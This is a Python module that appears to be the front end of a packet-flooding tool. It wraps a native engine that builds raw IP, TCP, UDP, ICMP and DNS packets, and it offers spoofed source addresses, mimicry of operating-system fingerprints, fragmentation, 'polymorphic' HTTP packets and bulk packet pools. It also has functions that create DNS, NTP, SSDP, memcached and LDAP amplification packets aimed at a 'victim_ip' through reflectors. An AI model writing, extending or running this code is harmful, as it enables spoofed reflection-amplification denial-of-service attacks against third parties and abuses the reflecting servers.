"""Native-backed CPU packet engine facade."""

from __future__ import annotations

import os
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Union

from . import _cpu_packet_engine_native as _native

# Protocol numbers
PROTO_ICMP = 1
PROTO_TCP = 6
PROTO_UDP = 17

# TCP Flags
TCP_FIN = 0x01
TCP_SYN = 0x02
TCP_RST = 0x04
TCP_PSH = 0x08
TCP_ACK = 0x10
TCP_URG = 0x20
TCP_ECE = 0x40
TCP_CWR = 0x80

# TCP Option kinds
TCP_OPT_EOL = 0
TCP_OPT_NOP = 1
TCP_OPT_MSS = 2
TCP_OPT_WSCALE = 3
TCP_OPT_SACK_OK = 4
TCP_OPT_SACK = 5
TCP_OPT_TIMESTAMP = 8

# Ethernet
ETHERTYPE_IPV4 = 0x0800
ETH_HEADER_LEN = 14

# ICMP
ICMP_ECHO_REQUEST = 8

# DNS
DNS_QUERY_FLAG = 0x0100
DNS_QR_QUERY = 0x0000
DNS_CLASS_IN = 1

_DNS_QTYPE_MAP: Dict[str, int] = {
    "A": 1,
    "NS": 2,
    "CNAME": 5,
    "SOA": 6,
    "PTR": 12,
    "MX": 15,
    "TXT": 16,
    "AAAA": 28,
    "SRV": 33,
    "ANY": 255,
}

_PROTO_STR_TO_INT: Dict[str, int] = {
    "tcp": PROTO_TCP,
    "udp": PROTO_UDP,
    "icmp": PROTO_ICMP,
}


@dataclass(frozen=True)
class OSProfile:
    name: str
    ttl: int
    window: int
    tcp_options: tuple


OS_WINDOWS_10 = OSProfile(
    name="windows_10",
    ttl=128,
    window=64240,
    tcp_options=(
        (TCP_OPT_MSS, 1460),
        (TCP_OPT_NOP, None),
        (TCP_OPT_WSCALE, 8),
        (TCP_OPT_NOP, None),
        (TCP_OPT_NOP, None),
        (TCP_OPT_SACK_OK, None),
    ),
)
OS_LINUX_5 = OSProfile(
    name="linux_5",
    ttl=64,
    window=29200,
    tcp_options=(
        (TCP_OPT_MSS, 1460),
        (TCP_OPT_SACK_OK, None),
        (TCP_OPT_TIMESTAMP, None),
        (TCP_OPT_NOP, None),
        (TCP_OPT_WSCALE, 7),
    ),
)
OS_MACOS_14 = OSProfile(
    name="macos_14",
    ttl=64,
    window=65535,
    tcp_options=(
        (TCP_OPT_MSS, 1460),
        (TCP_OPT_NOP, None),
        (TCP_OPT_WSCALE, 6),
        (TCP_OPT_NOP, None),
        (TCP_OPT_NOP, None),
        (TCP_OPT_TIMESTAMP, None),
        (TCP_OPT_SACK_OK, None),
        (TCP_OPT_EOL, None),
    ),
)
OS_PROFILES = (OS_WINDOWS_10, OS_LINUX_5, OS_MACOS_14)
_PROFILE_TCP_OPTIONS_CACHE: Dict[str, Tuple[bytes, Tuple[int, ...]]] = {}


@dataclass
class SpoofingOptions:
    mode: str = "realistic"
    subnet: Optional[str] = None
    list_file: Optional[str] = None


@dataclass
class PacketConfig:
    target_ip: str
    target_port: int
    protocol: str = "tcp"
    spoof: bool = False
    spoof_opts: Optional[SpoofingOptions] = None
    payload: Optional[Union[bytes, bytearray, str]] = None
    tcp_flags: str = "S"
    ttl: Optional[int] = None
    tos: Optional[int] = None
    window: Optional[int] = None
    fragment_enabled: bool = False
    fragment_size: int = 800
    pad_size: int = 0
    attack_vector: str = "basic"
    dns_name: str = "example.com"
    dns_qtype: Union[str, List[str]] = "A"
    dns_edns: bool = False
    dns_recursive: bool = True
    target_ip_int: int = field(init=False, repr=False, default=0)
    protocol_int: int = field(init=False, repr=False, default=0)
    tcp_flags_int: int = field(init=False, repr=False, default=0)
    fixed_tcp_options_bytes: bytes = field(init=False, repr=False, default=b"")
    precomputed_profile: Optional[OSProfile] = field(init=False, repr=False, default=None)

    def __post_init__(self) -> None:
        if self.spoof_opts is None:
            self.spoof_opts = SpoofingOptions()
        self.protocol = str(self.protocol or "tcp").lower()
        self.protocol_int = int(_PROTO_STR_TO_INT.get(self.protocol, 0) or 0)
        try:
            self.target_ip_int = ip_to_int(self.target_ip)
        except (OSError, RuntimeError, ValueError, TypeError, AttributeError, ImportError, KeyError, IndexError):
            self.target_ip_int = 0
        self.tcp_flags_int = parse_tcp_flags(self.tcp_flags) if self.protocol == "tcp" else 0

        fixed_profile_name = str(os.environ.get("SAMURAI_CPU_FIXED_OS_PROFILE", "") or "").strip().lower()
        if fixed_profile_name:
            for prof in OS_PROFILES:
                if prof.name.lower() == fixed_profile_name:
                    self.precomputed_profile = prof
                    break


class RawPacket:
    __slots__ = ("_data",)

    def __init__(self, data: bytes):
        self._data = data

    def __bytes__(self) -> bytes:
        return self._data

    def __len__(self) -> int:
        return len(self._data)

    def __repr__(self) -> str:
        return f"RawPacket({len(self._data)} bytes)"

    @property
    def data(self) -> bytes:
        return self._data

    def haslayer(self, _: object) -> bool:
        return False


def _checksum(data: bytes | bytearray | memoryview) -> int:
    return _native._checksum(data)


def _pseudo_header_checksum(src_ip: int, dst_ip: int, protocol: int, l4_length: int) -> int:
    return _native._pseudo_header_checksum(src_ip, dst_ip, protocol, l4_length)


def ip_to_int(ip_str: str) -> int:
    return int(_native.ip_to_int(ip_str)) & 0xFFFFFFFF


def int_to_ip(val: int) -> str:
    return _native.int_to_ip(val)


def ip_to_bytes(ip_str: str) -> bytes:
    return _native.ip_to_bytes(ip_str)


def generate_random_ip() -> str:
    return _native.generate_random_ip()


def generate_realistic_ip() -> str:
    return _native.generate_realistic_ip()


def generate_ip_from_subnet(subnet: str) -> str:
    return _native.generate_ip_from_subnet(subnet)


def load_ips_from_file(file_path: str) -> List[str]:
    return _native.load_ips_from_file(file_path)


def resolve_local_source_ip(target_ip: str) -> str:
    return _native.resolve_local_source_ip(target_ip)


def get_spoofed_ip(mode: str = "realistic", subnet: Optional[str] = None, list_file: Optional[str] = None) -> str:
    return _native.get_spoofed_ip(mode=mode, subnet=subnet, list_file=list_file)


def build_tcp_options(options: tuple | list) -> bytes:
    return _native.build_tcp_options(options)


def _normalize_u8_seq(data: Optional[Union[bytes, bytearray, memoryview, List[int], Tuple[int, ...]]]) -> Optional[List[int]]:
    if data is None:
        return None
    if isinstance(data, memoryview):
        data = data.tobytes()
    if isinstance(data, (bytes, bytearray)):
        return list(data)
    return list(data)


def build_ipv4_header(
    src_ip: str,
    dst_ip: str,
    protocol: int,
    payload_len: int,
    ttl: int = 64,
    tos: int = 0,
    identification: int = 0,
    flags_frag: int = 0x4000,
    options: Optional[Union[bytes, bytearray, List[int], Tuple[int, ...]]] = None,
) -> bytes:
    return _native.build_ipv4_header(src_ip, dst_ip, protocol, payload_len, ttl, tos, identification, flags_frag, _normalize_u8_seq(options))


def build_tcp_header(
    src_port: int,
    dst_port: int,
    seq: int = 0,
    ack: int = 0,
    flags: int = TCP_SYN,
    window: int = 65535,
    urgent: int = 0,
    options_bytes: Optional[Union[bytes, bytearray, List[int], Tuple[int, ...]]] = None,
    src_ip_int: int = 0,
    dst_ip_int: int = 0,
    payload: Optional[Union[bytes, bytearray, str]] = None,
) -> bytes:
    return _native.build_tcp_header(
        src_port,
        dst_port,
        seq,
        ack,
        flags,
        window,
        urgent,
        _normalize_u8_seq(options_bytes),
        int(src_ip_int) & 0xFFFFFFFF,
        int(dst_ip_int) & 0xFFFFFFFF,
        payload,
    )


def build_udp_header(
    src_port: int,
    dst_port: int,
    payload: Optional[Union[bytes, bytearray, str]] = None,
    src_ip_int: int = 0,
    dst_ip_int: int = 0,
    compute_checksum: bool = True,
) -> bytes:
    return _native.build_udp_header(
        src_port,
        dst_port,
        payload,
        int(src_ip_int) & 0xFFFFFFFF,
        int(dst_ip_int) & 0xFFFFFFFF,
        compute_checksum,
    )


def build_icmp_echo(identifier: int = 0, sequence: int = 0, payload: Optional[Union[bytes, bytearray, str]] = None) -> bytes:
    return _native.build_icmp_echo(identifier, sequence, payload)


def build_ethernet_header(
    dst_mac: Optional[Union[bytes, bytearray, List[int], Tuple[int, ...]]] = None,
    src_mac: Optional[Union[bytes, bytearray, List[int], Tuple[int, ...]]] = None,
    ethertype: int = ETHERTYPE_IPV4,
) -> bytes:
    return _native.build_ethernet_header(_normalize_u8_seq(dst_mac), _normalize_u8_seq(src_mac), ethertype)


def _encode_dns_name(name: str) -> bytes:
    labels = []
    trimmed = str(name or "")
    if not trimmed or trimmed == ".":
        return b"\x00"
    if trimmed.endswith("."):
        trimmed = trimmed[:-1]
    total_len = len(trimmed.encode()) + 2
    if total_len > 255:
        raise ValueError("DNS name too long")
    for label in trimmed.split("."):
        if not label:
            raise ValueError("Invalid DNS name with empty label")
        encoded = label.encode()
        if len(encoded) > 63:
            raise ValueError("DNS label too long")
        labels.append(bytes((len(encoded),)) + encoded)
    return b"".join(labels) + b"\x00"


def build_dns_query(
    qname: str = "example.com",
    qtype: str = "A",
    recursive: bool = True,
    edns: bool = False,
    transaction_id: int = 0,
) -> bytes:
    return _native.build_dns_query(qname, qtype, recursive, edns, transaction_id)


def parse_tcp_flags(flags_str: str) -> int:
    return _native.parse_tcp_flags(flags_str)


def _get_profile_tcp_options_cached(profile: OSProfile) -> Tuple[bytes, Tuple[int, ...]]:
    cached = _PROFILE_TCP_OPTIONS_CACHE.get(profile.name)
    if cached is not None:
        return cached

    buf = bytearray()
    ts_offsets: List[int] = []
    for kind, value in profile.tcp_options:
        if kind == TCP_OPT_EOL:
            buf.append(0)
        elif kind == TCP_OPT_NOP:
            buf.append(1)
        elif kind == TCP_OPT_MSS:
            buf.extend(bytes((2, 4)))
            buf.extend(int(value if value is not None else 1460).to_bytes(2, "big"))
        elif kind == TCP_OPT_WSCALE:
            buf.extend(bytes((3, 3, int(value if value is not None else 7))))
        elif kind == TCP_OPT_SACK_OK:
            buf.extend(bytes((4, 2)))
        elif kind == TCP_OPT_TIMESTAMP:
            ts_offsets.append(len(buf) + 2)
            buf.extend(bytes((8, 10)))
            buf.extend(b"\x00" * 8)
    while len(buf) % 4 != 0:
        buf.append(0)
    out = (bytes(buf), tuple(ts_offsets))
    _PROFILE_TCP_OPTIONS_CACHE[profile.name] = out
    return out


def _build_profile_tcp_options(profile: OSProfile) -> bytes:
    base, ts_offsets = _get_profile_tcp_options_cached(profile)
    if not ts_offsets:
        return base
    import random
    import struct

    out = bytearray(base)
    for off in ts_offsets:
        struct.pack_into("!I", out, off, random.randint(1, 0xFFFFFFFF))
    return bytes(out)


def _select_os_profile() -> OSProfile:
    import random

    fixed_profile_name = str(os.environ.get("SAMURAI_CPU_FIXED_OS_PROFILE", "") or "").strip().lower()
    if fixed_profile_name:
        for profile in OS_PROFILES:
            if profile.name.lower() == fixed_profile_name:
                return profile
    return random.choice(OS_PROFILES)


def _get_source_ip(cfg: PacketConfig) -> str:
    if cfg.spoof and cfg.spoof_opts:
        return get_spoofed_ip(
            mode=cfg.spoof_opts.mode,
            subnet=cfg.spoof_opts.subnet,
            list_file=cfg.spoof_opts.list_file,
        )
    return resolve_local_source_ip(cfg.target_ip)


def build_transport_packet(cfg: PacketConfig) -> bytes:
    return _native.build_transport_packet(cfg)


def build_dns_packet(cfg: PacketConfig) -> bytes:
    return _native.build_dns_packet(cfg)


def build_polymorphic_http_packet(cfg: PacketConfig) -> bytes:
    return _native.build_polymorphic_http_packet(cfg)


def create_packet(cfg: PacketConfig) -> bytes:
    return _native.create_packet(cfg)


def generate_packet_pool(
    cfg: PacketConfig,
    count: int,
    uniform_size: bool = True,
    low_peak_memory: bool = False,
) -> Tuple[bytes, int]:
    return _native.generate_packet_pool(cfg, count, uniform_size, low_peak_memory)


def generate_packet_pool_view(
    cfg: PacketConfig,
    count: int,
    uniform_size: bool = True,
    low_peak_memory: bool = False,
) -> Tuple[memoryview, int]:
    owner, packet_size = _native.generate_packet_pool_owner(cfg, count, uniform_size, low_peak_memory)
    return memoryview(owner), packet_size


def fragment_packet(packet: bytes | bytearray | memoryview, fragment_size: int = 800) -> List[bytes]:
    return _native.fragment_packet(packet, fragment_size)


def add_ethernet_frame(
    ip_packet: bytes | bytearray | memoryview,
    dst_mac: Optional[Union[bytes, bytearray, List[int], Tuple[int, ...]]] = None,
    src_mac: Optional[Union[bytes, bytearray, List[int], Tuple[int, ...]]] = None,
) -> bytes:
    return _native.add_ethernet_frame(ip_packet, _normalize_u8_seq(dst_mac), _normalize_u8_seq(src_mac))


def create_dns_amp_packet(reflector_ip: str, victim_ip: str, dns_name: str = "isc.org") -> bytes:
    return _native.create_dns_amp_packet(reflector_ip, victim_ip, dns_name)


def create_ntp_amp_packet(reflector_ip: str, victim_ip: str) -> bytes:
    return _native.create_ntp_amp_packet(reflector_ip, victim_ip)


def create_ssdp_amp_packet(reflector_ip: str, victim_ip: str) -> bytes:
    return _native.create_ssdp_amp_packet(reflector_ip, victim_ip)


def create_memcached_amp_packet(reflector_ip: str, victim_ip: str) -> bytes:
    return _native.create_memcached_amp_packet(reflector_ip, victim_ip)


def create_ldap_amp_packet(reflector_ip: str, victim_ip: str) -> bytes:
    return _native.create_ldap_amp_packet(reflector_ip, victim_ip)


__all__ = [
    "_checksum",
    "_pseudo_header_checksum",
    "_encode_dns_name",
    "ip_to_int",
    "int_to_ip",
    "ip_to_bytes",
    "generate_random_ip",
    "generate_realistic_ip",
    "generate_ip_from_subnet",
    "load_ips_from_file",
    "resolve_local_source_ip",
    "get_spoofed_ip",
    "build_tcp_options",
    "build_ipv4_header",
    "build_tcp_header",
    "build_udp_header",
    "build_icmp_echo",
    "build_ethernet_header",
    "build_dns_query",
    "parse_tcp_flags",
    "build_transport_packet",
    "build_dns_packet",
    "build_polymorphic_http_packet",
    "create_packet",
    "generate_packet_pool",
    "generate_packet_pool_view",
    "fragment_packet",
    "add_ethernet_frame",
    "create_dns_amp_packet",
    "create_ntp_amp_packet",
    "create_ssdp_amp_packet",
    "create_memcached_amp_packet",
    "create_ldap_amp_packet",
    "PacketConfig",
    "SpoofingOptions",
    "RawPacket",
    "OSProfile",
    "OS_PROFILES",
    "OS_WINDOWS_10",
    "OS_LINUX_5",
    "OS_MACOS_14",
    "PROTO_ICMP",
    "PROTO_TCP",
    "PROTO_UDP",
    "TCP_FIN",
    "TCP_SYN",
    "TCP_RST",
    "TCP_PSH",
    "TCP_ACK",
    "TCP_URG",
    "TCP_ECE",
    "TCP_CWR",
    "TCP_OPT_EOL",
    "TCP_OPT_NOP",
    "TCP_OPT_MSS",
    "TCP_OPT_WSCALE",
    "TCP_OPT_SACK_OK",
    "TCP_OPT_SACK",
    "TCP_OPT_TIMESTAMP",
    "ETHERTYPE_IPV4",
    "ETH_HEADER_LEN",
    "ICMP_ECHO_REQUEST",
    "DNS_QUERY_FLAG",
    "DNS_QR_QUERY",
    "DNS_CLASS_IN",
]
